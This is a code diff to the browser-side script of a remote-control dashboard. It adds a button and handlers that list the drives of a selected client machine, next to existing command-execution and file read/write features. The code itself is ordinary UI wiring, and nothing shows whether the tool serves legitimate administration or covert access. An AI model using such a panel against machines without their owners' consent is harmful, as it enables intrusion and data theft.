@@ -9,6 +9,7 @@ const infoBtn = document.getElementById('info-btn');
 const execForm = document.getElementById('exec-form');
 const execCommandInput = document.getElementById('exec-command');
 const listBtn = document.getElementById('list-btn');
+const drivesBtn = document.getElementById('drives-btn');
 const readBtn = document.getElementById('read-btn');
 const saveBtn = document.getElementById('save-btn');
 const upBtn = document.getElementById('up-btn');
@@ -69,6 +70,25 @@ function renderClients(list) {
 
   clientSelect.value = currentClientId || clients[0].clientId;
   setClientDetails(clients.find((c) => c.clientId === clientSelect.value));
+}
+
+function renderDriveList(drives) {
+  fileListEl.innerHTML = '';
+  setCurrentPath(''); // Clear current path when showing drives
+  drives.forEach((drive) => {
+    const li = document.createElement('li');
+    li.className = 'dir';
+    const name = document.createElement('span');
+    name.textContent = drive;
+    const typeLabel = document.createElement('small');
+    typeLabel.textContent = 'drive';
+    li.appendChild(name);
+    li.appendChild(typeLabel);
+    li.addEventListener('click', () => {
+      browsePath(drive);
+    });
+    fileListEl.appendChild(li);
+  });
 }
 
 function normalizePath(input) {
@@ -233,6 +253,7 @@ connectBtn.addEventListener('click', async () => {
 clientSelect.addEventListener('change', () => {
   currentClientId = clientSelect.value;
   setClientDetails(clients.find((c) => c.clientId === currentClientId));
+  sendCommand('list_drives');
 });
 
 pingBtn.addEventListener('click', () => sendCommand('ping'));
@@ -287,6 +308,8 @@ saveBtn.addEventListener('click', () => {
   }
   sendCommand('write_file', { path, content: fileContentInput.value });
 });
+
+drivesBtn.addEventListener('click', () => sendCommand('list_drives'));
 
 upBtn.addEventListener('click', () => {
   const parent = parentPath(currentPath);
@@ -353,6 +376,7 @@ function connectSocket() {
       document.getElementById('login-panel').classList.add('hidden');
       dashboard.classList.remove('hidden');
       log('Connected as admin.');
+      if (currentClientId) sendCommand('list_drives');
       return;
     }
 
@@ -368,6 +392,16 @@ function connectSocket() {
     }
 
     if (data.type === 'result') {
+      if (data.command === 'list_drives') {
+        if (data.success && Array.isArray(data.result)) {
+          renderDriveList(data.result);
+          log(`Discovered ${data.result.length} drives on ${data.clientId}`);
+        } else {
+          log(`Failed to scout drives: ${data.error}`);
+        }
+        return;
+      }
+
       if (data.command === 'list_dir') {
         if (Array.isArray(data.result)) {
           renderFileList(data.result);
